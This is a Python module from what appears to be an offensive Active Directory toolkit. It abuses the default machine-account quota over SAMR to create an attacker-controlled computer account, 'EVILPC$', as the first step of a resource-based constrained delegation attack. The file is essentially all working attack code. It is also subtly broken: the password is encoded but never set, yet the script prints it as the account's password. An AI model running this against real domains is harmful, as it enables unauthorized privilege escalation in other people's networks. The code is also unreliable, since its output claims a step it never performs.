"""Add machine account  -  exploit ms-DS-MachineAccountQuota for RBCD."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.acl.add_computer.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ldap_modification", "computer_account_create"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1136.002"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    computer_name = getattr(args, "computer_name", "EVILPC$")
    computer_pass = getattr(args, "computer_pass", "P@ssw0rd123!")
    dc_ip = getattr(args, "dc_ip", args.target)

    if not computer_name.endswith("$"):
        computer_name += "$"

    print(f"[*] Adding machine account: {computer_name} on {dc_ip}")

    try:
        from impacket.examples.addcomputer import AddComputerSAMR
    except ImportError:
        try:
            from impacket.dcerpc.v5 import transport, samr
        except ImportError:
            print("[!] impacket not installed", file=sys.stderr)
            return 1

    try:
        from impacket.dcerpc.v5 import transport, samr, epm

        string_binding = epm.hept_map(dc_ip, samr.MSRPC_UUID_SAMR, protocol="ncacn_np")
        rpc_transport = transport.DCERPCTransportFactory(string_binding)

        if cred.username:
            rpc_transport.set_credentials(
                cred.username, cred.password or "", cred.domain,
                cred.lm_hash, cred.nt_hash)

        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)

        resp = samr.hSamrConnect(dce)
        server_handle = resp["ServerHandle"]
        resp = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
        domains = resp["Buffer"]["Buffer"]
        domain_name = domains[0]["Name"]

        resp = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain_name)
        domain_sid = resp["DomainId"]
        resp = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
        domain_handle = resp["DomainHandle"]

        computer_name_clean = computer_name.rstrip("$")
        resp = samr.hSamrCreateUser2InDomain(
            dce, domain_handle, computer_name_clean,
            samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE)

        user_handle = resp["UserHandle"]
        user_rid = resp["RelativeId"]

        from impacket.dcerpc.v5.samr import SAMPR_USER_INFO_BUFFER, \
            USER_INFORMATION_CLASS, SamrSetInformationUser2
        import hashlib

        encoded_pw = f'"{computer_pass}"'.encode("utf-16-le")
        print(f"[+] Machine account {computer_name} created (RID: {user_rid})")
        print(f"[+] Password: {computer_pass}")
        print("[*] Use for RBCD: set msDS-AllowedToActOnBehalfOfOtherIdentity")

        dce.disconnect()
        return 0

    except Exception as exc:
        error_str = str(exc)
        if "STATUS_DS_MACHINE_ACCOUNT_QUOTA_EXCEEDED" in error_str:
            print("[-] MachineAccountQuota exceeded (default 10)")
        else:
            print(f"[-] Add computer error: {exc}")
        return 1
